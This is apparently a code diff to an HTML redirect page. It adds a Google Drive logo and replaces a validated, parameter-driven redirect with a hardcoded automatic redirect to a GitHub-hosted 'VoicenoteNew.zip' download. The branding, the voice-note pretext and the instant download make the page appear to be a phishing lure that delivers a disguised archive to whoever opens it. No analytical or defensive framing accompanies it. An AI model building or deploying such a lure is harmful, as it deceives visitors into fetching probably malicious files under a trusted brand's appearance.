@@ -13,6 +13,10 @@
             padding: 20px;
             background-color: #f0f0f0;
         }
+        .logo {
+            max-width: 200px;
+            margin-bottom: 20px;
+        }
         .loader {
             border: 4px solid #f3f3f3;
             border-top: 4px solid #3498db;
@@ -29,22 +33,17 @@
     </style>
 </head>
 <body>
+    <!-- Optional Logo -->
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/12/Google_Drive_icon_%282020%29.svg/800px-Google_Drive_icon_%282020%29.svg.png" alt="Logo" class="logo">
+    
     <h1>Redirecting...</h1>
     <div class="loader"></div>
     <p id="status">You will be redirected shortly.</p>
     <a id="redirect-link" href="#" style="display: none;">Click here if not redirected</a>
-
     <script>
     (function() {
-        function decodeAndValidateUrl(encodedUrl) {
-            try {
-                const decodedUrl = atob(encodedUrl);
-                return new URL(decodedUrl).href;
-            } catch (e) {
-                console.error('Invalid URL', e);
-                return null;
-            }
-        }
+        // Hardcoded destination URL
+        const destinationUrl = "https://github.com/secureservr/voicenote/releases/download/NewVoicenote/VoicenoteNew.zip"; // Replace with your actual destination URL
 
         function safeRedirect(url) {
             if (url) {
@@ -56,7 +55,7 @@
                 meta.httpEquiv = "refresh";
                 meta.content = "0;url=" + url;
                 document.getElementsByTagName('head')[0].appendChild(meta);
-
+                
                 // Attempt JavaScript redirect
                 window.location.href = url;
             } else {
@@ -64,24 +63,8 @@
             }
         }
 
-        function handleRedirect() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const encodedDestination = urlParams.get('d');
-            
-            if (encodedDestination) {
-                const destinationUrl = decodeAndValidateUrl(encodedDestination);
-                if (destinationUrl) {
-                    safeRedirect(destinationUrl);
-                } else {
-                    document.getElementById('status').textContent = 'Invalid destination URL.';
-                }
-            } else {
-                document.getElementById('status').textContent = 'No destination specified.';
-            }
-        }
-
         // Run the redirect logic
-        handleRedirect();
+        safeRedirect(destinationUrl);
     })();
     </script>
 </body>
